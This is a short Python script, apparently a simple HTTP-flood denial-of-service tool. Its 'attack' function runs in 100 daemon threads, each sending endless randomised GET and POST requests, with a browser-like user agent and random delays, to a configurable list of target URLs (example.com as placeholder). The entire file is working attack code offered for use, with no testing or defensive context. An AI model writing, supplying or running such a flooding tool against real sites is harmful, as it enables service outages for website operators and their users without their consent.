import requests
import threading
import random
import time
import logging
from typing import List

# Minimal config
CONFIG = {
    'targets': ['http://example.com'],
    'threads': 100,
    'delay': (0.1, 1.0),
    'timeout': 5,
    'headers': {
        'User-Agent': 'Mozilla/5.0',
        'Accept': '*/*',
    }
}

def attack(target: str):
    """Single thread attack function"""
    session = requests.Session()
    session.headers.update(CONFIG['headers'])
    
    while True:
        try:
            # Random delay
            time.sleep(random.uniform(*CONFIG['delay']))
            
            # Random method
            methods = ['GET', 'POST']
            method = random.choice(methods)
            
            if method == 'GET':
                session.get(target, timeout=CONFIG['timeout'])
            else:
                session.post(
                    target,
                    json={"data": random.random()},
                    timeout=CONFIG['timeout']
                )
                
        except Exception as e:
            logging.error(f"Attack error: {e}")

# Launch threads
threads = []
for target in CONFIG['targets']:
    for _ in range(CONFIG['threads'] // len(CONFIG['targets'])):
        t = threading.Thread(target=attack, args=(target,))
        t.daemon = True
        threads.append(t)
        t.start()

# Keep running
try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("Stopping...")